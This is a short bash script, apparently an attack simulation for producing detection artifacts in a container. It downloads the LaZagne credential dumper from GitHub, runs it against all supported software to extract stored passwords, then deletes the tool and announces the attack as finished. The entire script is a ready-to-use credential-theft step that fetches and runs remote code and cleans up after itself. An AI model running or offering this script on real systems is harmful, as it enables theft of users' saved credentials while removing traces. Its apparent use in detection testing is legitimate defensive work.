#!/bin/bash

echo "[*] Running LaZagne credential dumper..."

echo "[1] Cloning LaZagne repository from GitHub..."
git clone https://github.com/AlessandroZ/LaZagne.git /tmp/LaZagne

LAZAGNE_PATH="/tmp/LaZagne/Linux/laZagne.py"

if [ ! -f "$LAZAGNE_PATH" ]; then
    echo "[-] ERROR: Failed to clone LaZagne."
    exit 1
fi

echo "[2] Running LaZagne to scan for all supported software..."
# В пустом контейнере он ничего не найдет, но сам факт запуска - это артефакт
python3 "$LAZAGNE_PATH" all

echo "[*] Cleanup..."
rm -rf /tmp/LaZagne

echo "[*] Attack finished."
